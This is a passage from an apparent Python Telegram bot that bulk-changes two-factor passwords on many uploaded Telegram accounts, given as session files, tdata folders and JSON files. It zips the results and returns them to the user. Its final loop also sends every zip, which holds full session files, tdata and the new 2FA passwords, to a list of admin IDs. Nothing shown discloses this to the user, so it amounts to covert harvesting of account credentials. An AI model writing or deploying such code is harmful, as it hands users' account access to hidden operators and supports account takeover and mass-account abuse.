                    text="<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 所有tdata转换失败，无法继续",
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                return
        
        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>2FA修改进行中</b>

模式: {'自动识别' if mode == 'auto' else '手动输入'}
找到 <b>{len(accounts)}</b> 个账号
正在处理，请稍候...""",
            parse_mode='HTML'
        )
        
        success_dir = os.path.join(temp_dir, "success")
        reset_success_dir = os.path.join(temp_dir, "reset_success")
        reset_failed_dir = os.path.join(temp_dir, "reset_failed")
        failed_dir = os.path.join(temp_dir, "failed")
        
        os.makedirs(success_dir, exist_ok=True)
        os.makedirs(reset_success_dir, exist_ok=True)
        os.makedirs(reset_failed_dir, exist_ok=True)
        os.makedirs(failed_dir, exist_ok=True)
        
        success_count = 0
        reset_success_count = 0
        reset_failed_count = 0
        failed_count = 0
        
        results = []
        
        for i, (phone, session_file, json_file, tdata_dir) in enumerate(accounts, 1):
            if i % 3 == 0 or i == len(accounts):
                try:
                    await status_msg.edit_text(
                        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>2FA修改进行中</b>

进度: {i}/{len(accounts)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} | <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji>重置成功: {reset_success_count} | <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji>重置失败: {reset_failed_count} | <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji>失败: {failed_count}""",
                        parse_mode='HTML'
                    )
                except:
                    pass
            
            result = await check_session_2fa(
                session_file, json_file, api_id, api_hash, 
                old_2fa=old_2fa, new_2fa=new_2fa, mode=mode, tdata_dir=tdata_dir
            )
            results.append(result)
            
            if result["status"] == "success":
                target_dir = success_dir
                success_count += 1
            elif result["status"] == "reset_success":
                target_dir = reset_success_dir
                reset_success_count += 1
            elif result["status"] == "reset_failed":
                target_dir = reset_failed_dir
                reset_failed_count += 1
            else:
                target_dir = failed_dir
                failed_count += 1
            
            account_folder = os.path.join(target_dir, phone)
            os.makedirs(account_folder, exist_ok=True)
            
            if tdata_dir and os.path.exists(tdata_dir):
                tdata_target = os.path.join(account_folder, "tdata")
                shutil.copytree(tdata_dir, tdata_target, dirs_exist_ok=True)
            
            if session_file and os.path.exists(session_file):
                shutil.copy2(session_file, os.path.join(account_folder, os.path.basename(session_file)))
            
            json_to_copy = result.get("json_path") if result.get("json_path") else json_file
            if json_to_copy and os.path.exists(json_to_copy):
                try:
                    with open(json_to_copy, 'r', encoding='utf-8') as f:
                        json_data = json.load(f)
                    
                    twofa_keys = ['2fa', '2FA', 'twofa', 'password', 'two_fa']
                    if result["new_2fa_set"] is not None:
                        new_val = result["new_2fa_set"]
                        for key in twofa_keys:
                            json_data[key] = new_val
                    else:
                        for key in twofa_keys:
                            json_data.pop(key, None)
                    
                    new_json_path = os.path.join(account_folder, os.path.basename(json_to_copy))
                    with open(new_json_path, 'w', encoding='utf-8') as f:
                        json.dump(json_data, f, indent=2, ensure_ascii=False)
                except Exception as e:
                    logger.warning(f"更新 JSON 失败 {json_to_copy}: {e}")
                    try:
                        shutil.copy2(json_to_copy, os.path.join(account_folder, os.path.basename(json_to_copy)))
                    except:
                        pass
            
            await asyncio.sleep(0.1)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        success_zip = os.path.join(temp_dir, "success.zip")
        if success_count > 0:
            with zipfile.ZipFile(success_zip, 'w') as zipf:
                for root, dirs, files in os.walk(success_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, success_dir)
                        zipf.write(file_path, arcname)
        
        reset_success_zip = os.path.join(temp_dir, "reset_success.zip")
        if reset_success_count > 0:
            with zipfile.ZipFile(reset_success_zip, 'w') as zipf:
                for root, dirs, files in os.walk(reset_success_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, reset_success_dir)
                        zipf.write(file_path, arcname)
        
        reset_failed_zip = os.path.join(temp_dir, "reset_failed.zip")
        if reset_failed_count > 0:
            with zipfile.ZipFile(reset_failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(reset_failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, reset_failed_dir)
                        zipf.write(file_path, arcname)
        
        failed_zip = os.path.join(temp_dir, "failed.zip")
        if failed_count > 0:
            with zipfile.ZipFile(failed_zip, 'w') as zipf:
                for root, dirs, files in os.walk(failed_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, failed_dir)
                        zipf.write(file_path, arcname)
        
        result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>2FA修改完成</b>

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 总账号: <b>{len(accounts)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功修改: <b>{success_count}</b>
• <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji> 重置成功: <b>{reset_success_count}</b>
• <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji> 重置失败: <b>{reset_failed_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>"""

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=result_text,
            parse_mode='HTML'
        )
        
        if success_count > 0:
            with open(success_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"success_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 成功修改2FA ({success_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if reset_success_count > 0:
            with open(reset_success_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"reset_success_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922612721244704425'>♻️</tg-emoji> 重置成功 ({reset_success_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if reset_failed_count > 0:
            with open(reset_failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"reset_failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5846008814129649022'>⚠️</tg-emoji> 重置失败 ({reset_failed_count}个)</b>",
                    parse_mode='HTML'
                )
        
        if failed_count > 0:
            with open(failed_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"failed_{timestamp}.zip",
                    caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 失败 ({failed_count}个)</b>",
                    parse_mode='HTML'
                )
        
        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue
            
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>2FA修改任务完成</b>

<tg-emoji emoji-id="5886412370347036129">👤</tg-emoji> 用户: <code>{user_id}</code>
模式: {'自动识别' if mode == 'auto' else '手动输入'}
<tg-emoji emoji-id="5886412370347036129">📊</tg-emoji> 总账号: <b>{len(accounts)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功修改: <b>{success_count}</b>
• <tg-emoji emoji-id="5922612721244704425">♻️</tg-emoji> 重置成功: <b>{reset_success_count}</b>
• <tg-emoji emoji-id="5846008814129649022">⚠️</tg-emoji> 重置失败: <b>{reset_failed_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: <b>{failed_count}</b>""",
                    parse_mode='HTML'
                )
                
                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                if success_count > 0:
                    with open(success_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"success_{user_id}_{admin_timestamp}.zip"
                        )
                
                if reset_success_count > 0:
                    with open(reset_success_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"reset_success_{user_id}_{admin_timestamp}.zip"
                        )
                
                if reset_failed_count > 0:
                    with open(reset_failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"reset_failed_{user_id}_{admin_timestamp}.zip"
                        )
                
                if failed_count > 0:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"failed_{user_id}_{admin_timestamp}.zip"
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
        
        try:
            await status_msg.delete()
        except:
            pass
